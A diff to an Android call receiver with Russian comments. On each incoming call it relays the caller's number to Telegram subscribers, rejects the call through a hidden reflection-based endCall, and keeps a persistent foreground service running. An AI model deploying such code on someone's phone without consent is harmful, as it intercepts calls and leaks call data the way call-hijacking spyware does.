@@ -11,13 +11,10 @@ public class CallReceiver extends BroadcastReceiver {
     private static final String TAG = "CallReceiver";
 
     @Override
-    context.startForegroundService(new Intent(context, KeepAliveService.class));
     public void onReceive(Context context, Intent intent) {
-        Log.d(TAG, "onReceive вызван, action=" + intent.getAction());
-
-        // Запускаем сервис (на всякий случай)
-        context.startForegroundService(new Intent(context, TelegramService.class));
-
+        // Запускаем сервис для постоянной работы
+        context.startForegroundService(new Intent(context, KeepAliveService.class));
+        
         String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
         String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
 
@@ -25,10 +22,7 @@ public class CallReceiver extends BroadcastReceiver {
 
         if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) && number != null && !number.isEmpty()) {
             String text = "📞 Звонок от: " + number;
-            Log.d(TAG, "Отправляем: " + text);
             TelegramSender.sendToAllSubscribers(context, text);
-
-            // Отклоняем звонок
             endCall(context);
         }
     }
@@ -44,7 +38,7 @@ public class CallReceiver extends BroadcastReceiver {
             Method endCallMethod = telephonyInterfaceClass.getDeclaredMethod("endCall");
             endCallMethod.setAccessible(true);
             endCallMethod.invoke(telephonyInterface);
-            Log.d(TAG, "Звонок успешно отклонён через отражение");
+            Log.d(TAG, "Звонок успешно отклонён");
         } catch (Exception e) {
             Log.e(TAG, "Не удалось отклонить звонок", e);
         }
